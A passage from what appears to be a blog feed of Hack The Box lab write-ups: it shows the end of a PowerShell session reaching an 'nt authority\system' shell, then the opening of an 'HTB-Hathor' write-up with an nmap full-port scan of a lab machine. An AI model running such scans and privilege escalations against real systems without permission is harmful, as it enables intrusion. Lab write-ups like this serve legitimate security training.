+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Install the latest PowerShell <span style="color:#66d9ef">for</span> new features and improvements! https://aka.ms/PSWindows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div>]]></content></item><item><title>HTB-Hathor Writeup</title><link>https://enilmalus.github.io/posts/htb-hathor-writeup/</link><pubDate>Tue, 22 Sep 2026 15:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-hathor-writeup/</guid><description>Nmap 扫描 使用 Nmap 扫描端口。
 ┌──(kali㉿kali)-[~/Work/Kali/Hathor] └─$ sudo nmap --min-rate 10000 -p- 10.129.230.109 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-20 22:11 -0400 Nmap scan report for 10.129.230.109 Host is up (0.16s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49664/tcp open unknown 49668/tcp open unknown 55786/tcp open unknown 55809/tcp open unknown 59050/tcp open unknown 59728/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 14.</description><content type="html"><![CDATA[<h2 id="nmap-扫描">Nmap 扫描</h2>
 <p>使用 Nmap 扫描端口。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Hathor<span style="color:#f92672">]</span>
